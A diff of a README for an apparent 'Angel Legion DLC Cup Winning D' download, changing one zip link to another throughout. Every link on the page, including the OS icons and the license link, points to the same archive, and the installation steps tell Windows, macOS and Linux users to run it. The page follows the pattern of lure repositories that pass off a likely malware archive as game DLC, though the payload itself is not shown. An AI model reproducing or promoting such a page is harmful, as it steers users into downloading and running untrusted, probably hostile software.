@@ -1,4 +1,4 @@
-# 🏆 Angel Legion DLC Cup Winning D [![Download](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip!-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip)
+# 🏆 Angel Legion DLC Cup Winning D [![Download](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip!-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip)
 
 Welcome to the *Angel Legion DLC Cup Winning D* experience repository: where strategy shines, heroes evolve, and ultimate achievements await every explorer. Acquire the sought-after DLC Cup and enrich your adventure with a heaven-forged toolkit—designed to complement your Angel Legion journey.
 
@@ -8,11 +8,11 @@ Welcome to the *Angel Legion DLC Cup Winning D* experience repository: where str
 
 |  | Windows 10/11 | macOS 12+ | Linux (Ubuntu 20.04+) | Android 8+ | iOS 14+ |
 |----|:---:|:---:|:---:|:---:|:---:|
-| ![Windows](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip) | ✅ |  |  |  |  |
-| ![macOS](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip) |  | ✅ |  |  |  |
-| ![Linux](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip) |  |  | ✅ |  |  |
-| ![Android](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip) |  |  |  | ✅ |  |
-| ![iOS](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip) |  |  |  |  | ✅ |
+| ![Windows](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip) | ✅ |  |  |  |  |
+| ![macOS](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip) |  | ✅ |  |  |  |
+| ![Linux](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip) |  |  | ✅ |  |  |
+| ![Android](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip) |  |  |  | ✅ |  |
+| ![iOS](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip) |  |  |  |  | ✅ |
 
 *Every OS was tested with polished accuracy to ensure your DLC Cup journey remains as celestial as possible.*
 
@@ -78,13 +78,13 @@ Welcome to the future: direct communication with **OpenAI and Claude** AIs is wo
 ## 🚀 Installation Steps
 
 1. **Download the Cup Package**
-    - Push the badge at the top or click here: https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip
+    - Push the badge at the top or click here: https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip
 2. **Extract the archive**
     - Use your favorite archiver and extract to your chosen directory.
 3. **Run the Installer**
-    - Windows: double-click `https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip`
-    - macOS: open `https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip`
-    - Linux: execute `https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip` via terminal
+    - Windows: double-click `https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip`
+    - macOS: open `https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip`
+    - Linux: execute `https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip` via terminal
     - Android/iOS: open with respective system package installers.
 4. **Follow On-Screen Instructions**
     - Authorize permissions as required, and choose your Angel Legion installation path.
@@ -110,10 +110,10 @@ The above copyright notice and this permission notice shall be included in all c
 
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND...
 
-[Read the full MIT license.](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip)
+[Read the full MIT license.](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip)
 
 ---
 
-# 🏆 Angel Legion DLC Cup Winning D [![Download](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip!-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel-legion-dlc-cup-winning-d-collection_1.5.zip)
+# 🏆 Angel Legion DLC Cup Winning D [![Download](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip!-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ellaestrera2510/angel-legion-dlc-cup-winning-d-collection/branch/copassionate/angel_collection_dlc_d_legion_cup_winning_1.3-beta.2.zip)
 
 Actuate your calling. Seize the Cup. Evolve your legend.
